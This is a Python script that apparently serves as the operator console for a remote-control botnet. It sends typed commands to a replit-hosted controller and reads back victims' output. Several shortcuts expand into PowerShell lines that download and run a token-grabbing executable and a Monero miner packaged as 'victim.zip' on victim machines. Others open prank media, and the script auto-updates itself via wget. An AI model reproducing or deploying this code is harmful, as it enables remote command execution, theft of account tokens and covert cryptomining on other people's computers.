import os
import requests
print("a")
import subprocess
os.system("wget -O new.py https://raw.githubusercontent.com/jonathanbreitg/dump/main/control_send.py")
import filecmp
if filecmp.cmp("control_send.py","new.py"):
	print("latest version")
	os.system("rm new.py")
else:
	os.system("rm control_send.py")
	print("updating")
	os.system("mv new.py control_send.py")
	os.execl(sys.executable, sys.executable, *sys.argv)
from time import sleep
POST_URL = "https://epic-servering-but-pytyohn.jonathanbreitg.repl.co/POST-CONTROLLER"

while True:
	command_to_send = input("SHELL>")
	if command_to_send == "token":
		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://github.com/jonathanbreitg/monero-minerV2/blob/main/grab_token.exe?raw=true.exe', 'grab_token.exe');./grab_token.exe"
	elif command_to_send == "cpu":
		command_to_send = "wmic cpu get loadpercentage"
	elif command_to_send == "r":
		command_to_send = "start chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ"
	elif command_to_send == "barak":
		command_to_send = "start chrome https://media.discordapp.net/stickers/865029615457271828.png?size=160"
	elif command_to_send == "mine_monero":
		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://github.com/jonathanbreitg/monero-minerV2/blob/main/victim.zip?raw=true', 'victim.zip');Expand-Archive -Path victim.zip -DestinationPath victim;cd victim;cd victim;./victim.exe"
	elif command_to_send == "barak2":
		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://media.discordapp.net/stickers/865029615457271828.png?size=160', 'barak.png');./barak.png"
	elif command_to_send == "barak3":
		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://cdn.discordapp.com/attachments/646407583074091011/916798477357449216/barakVID.mp4', 'barakVID.mp4');./barakVID.mp4"
	elif command_to_send == "barak4":
		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://cdn.discordapp.com/attachments/876192301918068749/916799736172929044/3e789542-37fc-4ebb-8692-ce143393ff37.png', 'barak4.png');./barak4.png"
	pre = requests.get(url="https://epic-servering-but-pytyohn.jonathanbreitg.repl.co")
	pre = pre.text
	obj = {"data":str(command_to_send)}
	req = requests.post(url=POST_URL,data=obj)
	while True:
		now = requests.get(url="https://epic-servering-but-pytyohn.jonathanbreitg.repl.co")
		now = now.text
		if not(now == pre):
			splitted = now.split("<br>")
			print(splitted[-1])
			break
